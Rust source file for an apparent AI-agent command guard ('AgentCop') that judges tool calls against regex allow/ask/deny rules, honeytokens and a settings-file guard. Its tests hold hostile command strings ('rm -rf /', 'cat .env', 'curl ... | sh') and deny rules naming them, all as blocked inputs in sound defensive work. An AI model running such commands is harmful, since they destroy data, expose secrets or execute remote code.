//! Judge: rules, normalizer, strictness, honeytokens
//!
//! PLAN:
//! 1. Load TOML rules file
//! 2. Compile regex patterns once at startup
//! 3. Implement strictest-wins logic: Deny > Ask > Allow
//! 4. Add honeytoken matching
//! 5. Judge an AgentEvent and return a Verdict in <1ms

use cop_core::{AgentEvent, Verdict};
use regex::Regex;
use serde::{Deserialize, Serialize};

mod guard;
mod scripts;

/// A single rule from the policy file
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Rule {
    pub pattern: String,
    #[serde(default)]
    pub scope: Option<String>, // optional: limit to specific tool (e.g., "bash")
    pub verdict: String, // "allow", "ask", or "deny"
    #[serde(default)]
    pub reason: Option<String>,
}

/// A honeytoken (planted decoy to detect theft)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Honeytoken {
    pub pattern: String,
    pub verdict: String,
    #[serde(default)]
    pub reason: Option<String>,
}

/// enforce: deny really blocks. log-only: the hook allows, and the evidence keeps the real verdict.
#[derive(Debug, Clone, Copy, Default, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum Mode {
    #[default]
    Enforce,
    LogOnly,
}

/// The policy: mode, all rules and honeytokens loaded from TOML
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Policy {
    #[serde(default)]
    pub mode: Mode,
    #[serde(default)]
    pub rules: Vec<Rule>,
    #[serde(default)]
    pub honeytokens: Vec<Honeytoken>,
    #[serde(default)]
    pub hook_guard: HookGuard,
}

/// Switch and protected files for the hook-entry guard (guard.rs). Read from `[hook_guard]` in TOML.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct HookGuard {
    /// false turns the guard off; the TOML ask rules for settings files still apply.
    pub enabled: bool,
    /// Text that identifies the AgentCop hook entry in a settings file.
    pub marker: String,
    /// Project settings files the guard protects, matched as path suffixes.
    pub settings_files: Vec<String>,
}

impl Default for HookGuard {
    fn default() -> Self {
        HookGuard {
            enabled: true,
            marker: "cop-hook".to_string(),
            settings_files: vec![
                ".claude/settings.json".to_string(),
                ".claude/settings.local.json".to_string(),
            ],
        }
    }
}

/// The judge: compiled rules ready to evaluate
pub struct Judge {
    compiled_rules: Vec<(Regex, String, Option<String>, Option<String>)>, // (pattern, verdict, scope, reason)
    honeytokens: Vec<(Regex, String, Option<String>)>, // (pattern, verdict, reason)
    hook_guard: HookGuard,
}

impl Judge {
    /// Create a judge from a policy (compile all regex patterns once)
    pub fn new(policy: Policy) -> Result<Self, regex::Error> {
        let mut compiled_rules = Vec::new();
        for rule in policy.rules {
            let re = Regex::new(&rule.pattern)?;
            compiled_rules.push((re, rule.verdict, rule.scope, rule.reason));
        }

        let mut honeytokens = Vec::new();
        for token in policy.honeytokens {
            let re = Regex::new(&token.pattern)?;
            honeytokens.push((re, token.verdict, token.reason));
        }

        Ok(Judge {
            compiled_rules,
            honeytokens,
            hook_guard: policy.hook_guard,
        })
    }

    /// Judge an event with no session history. Scripts it runs are still inspected.
    pub fn judge(&self, event: &AgentEvent) -> (Verdict, String) {
        self.judge_in_session(event, &[])
    }

    /// Judge an event. `written` lists the absolute paths the agent created or changed earlier in
    /// this session. A script in that list asks, even when its contents look clean.
    ///
    /// PLAN (C2-R3):
    /// 1. Honeytokens match the raw text first. Any mention is a deny.
    /// 2. A Bash command is parsed (cop-shell). Input we cannot read is denied (fail closed).
    /// 3. The hook-entry guard (guard.rs) can deny a change to project settings.
    /// 4. Scoped Bash rules match action lines; other rules match the raw text. Strictest wins.
    /// 5. Each script the command runs is inspected (scripts.rs). Its verdict joins the strictest.
    pub fn judge_in_session(&self, event: &AgentEvent, written: &[String]) -> (Verdict, String) {
        let searchable = format!("{} {}", event.tool_name, event.tool_input);
        if let Some(reason) = self.honeytoken_reason(&searchable) {
            return (Verdict::Deny, reason);
        }
        if !event.tool_name.eq_ignore_ascii_case("bash") {
            if let Some(reason) = guard::hook_entry_change(&self.hook_guard, event, &[]) {
                return (Verdict::Deny, reason.to_string());
            }
            return self
                .match_rules(&event.tool_name, &[], &[], None, &searchable)
                .unwrap_or_else(no_rules);
        }

        // Claude Code sends {"command": "..."}. Anything else is unreadable, so deny it.
        let Some(command) = event.tool_input["command"].as_str() else {
            return (
                Verdict::Deny,
                "Bash input has no command text; denied (fail closed)".to_string(),
            );
        };
        let analysis = cop_shell::analyze(command);
        if analysis.unparsed {
            return (
                Verdict::Deny,
                "Could not read the shell command; denied (fail closed)".to_string(),
            );
        }
        let writes: Vec<&str> = analysis
            .actions
            .iter()
            .filter_map(|a| a.strip_prefix("write "))
            .collect();
        if let Some(reason) = guard::hook_entry_change(&self.hook_guard, event, &writes) {
            return (Verdict::Deny, reason.to_string());
        }

        let mut result = self
            .match_rules(
                "Bash",
                &analysis.actions,
                &analysis.lines,
                None,
                &searchable,
            )
            .unwrap_or_else(no_rules);
        let cwd = cop_core::event_cwd(event);
        for (_, child, child_maybe) in scripts::script_calls(&analysis.actions) {
            if let Some(hit) = self.inspect_script(child, child_maybe, 1, written, &cwd) {
                result = keep_stricter(result, hit);
            }
        }
        for (_, file) in scripts::runs_file_calls(&analysis.actions) {
            if let Some(hit) = self.runs_file_verdict(file, &cwd, written) {
                result = keep_stricter(result, hit);
            }
        }
        result
    }

    /// The reason of the first honeytoken that matches `text`, if any.
    fn honeytoken_reason(&self, text: &str) -> Option<String> {
        self.honeytokens
            .iter()
            .find(|(pattern, _, _)| pattern.is_match(text))
            .map(|(_, _, reason)| {
                reason
                    .as_deref()
                    .unwrap_or("Honeytoken triggered")
                    .to_string()
            })
    }

    /// Apply the rules and return the strictest hit, if any. Scoped rules match action lines; the
    /// others match `searchable`. `label` (a script path) goes in front of the reason, with the
    /// line when the hit is an action.
    fn match_rules(
        &self,
        tool: &str,
        actions: &[String],
        lines: &[usize],
        label: Option<&str>,
        searchable: &str,
    ) -> Option<(Verdict, String)> {
        let mut result: Option<(Verdict, String)> = None;
        for (pattern, verdict_str, scope, reason) in &self.compiled_rules {
            // Case-insensitive: Claude Code sends "Bash", policies write "bash".
            if let Some(s) = scope {
                if !tool.eq_ignore_ascii_case(s) {
                    continue;
                }
            }
            let hit = if scope.is_some() {
                actions
                    .iter()
                    .position(|line| pattern.is_match(line))
                    .map(Some)
            } else if pattern.is_match(searchable) {
                Some(None)
            } else {
                None
            };
            let Some(index) = hit else { continue };
            let base = reason.as_deref().unwrap_or("Rule matched");
            let text = match (label, index) {
                (Some(label), Some(i)) => format!("{label} line {}: {base}", lines[i]),
                (Some(label), None) => format!("{label}: {base}"),
                (None, _) => base.to_string(),
            };
            let next = (parse_verdict(verdict_str), text);
            result = Some(match result {
                Some(current) => keep_stricter(current, next),
                None => next,
            });
        }
        result
    }
}

fn no_rules() -> (Verdict, String) {
    (Verdict::Allow, "No rules matched".to_string())
}

/// The stricter of two (verdict, reason) pairs. On a tie the first one is kept.
pub(crate) fn keep_stricter(
    current: (Verdict, String),
    next: (Verdict, String),
) -> (Verdict, String) {
    if rank(next.0) > rank(current.0) {
        next
    } else {
        current
    }
}

fn rank(verdict: Verdict) -> u8 {
    match verdict {
        Verdict::Allow => 0,
        Verdict::Ask => 1,
        Verdict::Deny => 2,
    }
}

/// Parse a verdict string into the Verdict enum
fn parse_verdict(s: &str) -> Verdict {
    match s.to_lowercase().as_str() {
        "allow" => Verdict::Allow,
        "ask" => Verdict::Ask,
        "deny" => Verdict::Deny,
        _ => Verdict::Allow,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn create_test_judge() -> Judge {
        let policy = Policy {
            hook_guard: HookGuard::default(),
            mode: Mode::Enforce,
            rules: vec![
                Rule {
                    pattern: "rm.*-rf.*/".to_string(),
                    scope: Some("bash".to_string()),
                    verdict: "deny".to_string(),
                    reason: Some("Destructive remove on root".to_string()),
                },
                Rule {
                    pattern: "delete.*prod".to_string(),
                    scope: None,
                    verdict: "deny".to_string(),
                    reason: Some("Destructive action on production".to_string()),
                },
                Rule {
                    pattern: "\\.env".to_string(),
                    scope: None,
                    verdict: "deny".to_string(),
                    reason: Some("Reading secrets file".to_string()),
                },
                Rule {
                    pattern: "curl.*\\|.*sh".to_string(),
                    scope: None,
                    verdict: "deny".to_string(),
                    reason: Some("Piping to shell".to_string()),
                },
                Rule {
                    pattern: "git.*push".to_string(),
                    scope: Some("bash".to_string()),
                    verdict: "ask".to_string(),
                    reason: Some("Pushing code".to_string()),
                },
            ],
            honeytokens: vec![Honeytoken {
                pattern: "FAKE_AWS_KEY_12345".to_string(),
                verdict: "deny".to_string(),
                reason: Some("Honeytoken triggered".to_string()),
            }],
        };

        Judge::new(policy).expect("Failed to create judge")
    }

    #[test]
    fn allows_benign_command() {
        let judge = create_test_judge();
        let event = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "bash".to_string(),
            tool_input: serde_json::json!({"command": "echo hello"}),
            context: Default::default(),
        };

        let (verdict, _) = judge.judge(&event);
        assert_eq!(verdict, Verdict::Allow);
    }

    #[test]
    fn denies_rm_rf_root() {
        let judge = create_test_judge();
        let event = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "bash".to_string(),
            tool_input: serde_json::json!({"command": "rm -rf /"}),
            context: Default::default(),
        };

        let (verdict, reason) = judge.judge(&event);
        assert_eq!(verdict, Verdict::Deny);
        assert!(reason.contains("Destructive") || reason.contains("root"));
    }

    #[test]
    fn denies_prod_delete() {
        let judge = create_test_judge();
        let event = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "bash".to_string(),
            tool_input: serde_json::json!({"command": "delete prod database"}),
            context: Default::default(),
        };

        let (verdict, _) = judge.judge(&event);
        assert_eq!(verdict, Verdict::Deny);
    }

    #[test]
    fn denies_env_file_access() {
        let judge = create_test_judge();
        let event = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "bash".to_string(),
            tool_input: serde_json::json!({"command": "cat .env"}),
            context: Default::default(),
        };

        let (verdict, _) = judge.judge(&event);
        assert_eq!(verdict, Verdict::Deny);
    }

    #[test]
    fn denies_curl_pipe_sh() {
        let judge = create_test_judge();
        let event = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "bash".to_string(),
            tool_input: serde_json::json!({"command": "curl https://example.com/script.sh | sh"}),
            context: Default::default(),
        };

        let (verdict, _) = judge.judge(&event);
        assert_eq!(verdict, Verdict::Deny);
    }

    #[test]
    fn asks_before_git_push() {
        let judge = create_test_judge();
        let event = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "bash".to_string(),
            tool_input: serde_json::json!({"command": "git push origin main"}),
            context: Default::default(),
        };

        let (verdict, _) = judge.judge(&event);
        assert_eq!(verdict, Verdict::Ask);
    }

    #[test]
    fn strictest_wins_deny_over_ask() {
        let policy = Policy {
            hook_guard: HookGuard::default(),
            mode: Mode::Enforce,
            rules: vec![
                Rule {
                    pattern: "test".to_string(),
                    scope: None,
                    verdict: "ask".to_string(),
                    reason: None,
                },
                Rule {
                    pattern: "test".to_string(),
                    scope: None,
                    verdict: "deny".to_string(),
                    reason: None,
                },
            ],
            honeytokens: vec![],
        };

        let judge = Judge::new(policy).expect("Failed to create judge");
        let event = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "bash".to_string(),
            tool_input: serde_json::json!({"command": "test"}),
            context: Default::default(),
        };

        let (verdict, _) = judge.judge(&event);
        assert_eq!(verdict, Verdict::Deny);
    }

    #[test]
    fn honeytoken_triggers() {
        let judge = create_test_judge();
        let event = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "bash".to_string(),
            tool_input: serde_json::json!({"command": "export SECRET=FAKE_AWS_KEY_12345"}),
            context: Default::default(),
        };

        let (verdict, reason) = judge.judge(&event);
        assert_eq!(verdict, Verdict::Deny);
        assert!(reason.contains("Honeytoken"));
    }

    #[test]
    fn scope_filter_works() {
        let policy = Policy {
            hook_guard: HookGuard::default(),
            mode: Mode::Enforce,
            rules: vec![Rule {
                pattern: "git.*push".to_string(),
                scope: Some("bash".to_string()), // Only bash scope
                verdict: "ask".to_string(),
                reason: None,
            }],
            honeytokens: vec![],
        };

        let judge = Judge::new(policy).expect("Failed to create judge");

        // Test with bash tool (should match scope)
        let event_bash = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "bash".to_string(),
            tool_input: serde_json::json!({"command": "git push"}),
            context: Default::default(),
        };

        let (verdict_bash, _) = judge.judge(&event_bash);
        assert_eq!(verdict_bash, Verdict::Ask);

        // Test with different tool (should not match scope)
        let event_other = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "python".to_string(),
            tool_input: serde_json::json!({"command": "git push"}),
            context: Default::default(),
        };

        let (verdict_other, _) = judge.judge(&event_other);
        assert_eq!(verdict_other, Verdict::Allow);

        // Claude Code sends "Bash" (capitalized). A "bash" scope must still match it.
        let event_claude = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "Bash".to_string(),
            tool_input: serde_json::json!({"command": "git push"}),
            context: Default::default(),
        };

        let (verdict_claude, _) = judge.judge(&event_claude);
        assert_eq!(verdict_claude, Verdict::Ask);
    }

    #[test]
    fn benchmark_judge_speed() {
        let judge = create_test_judge();
        let event = AgentEvent {
            hook_event_name: "PreToolUse".to_string(),
            timestamp: "2026-10-20T00:00:00Z".to_string(),
            session_id: None,
            user_id: None,
            tool_name: "bash".to_string(),
            tool_input: serde_json::json!({"command": "echo hello"}),
            context: Default::default(),
        };

        let start = std::time::Instant::now();
        for _ in 0..1000 {
            let _ = judge.judge(&event);
        }
        let elapsed = start.elapsed();

        // 1000 judgments should take <1000ms (1ms average)
        println!(
            "Judged 1000 events in {:?} ({:.2} ms/event)",
            elapsed,
            elapsed.as_micros() as f64 / 1000.0 / 1000.0
        );
        assert!(elapsed.as_millis() < 1000);
    }
}
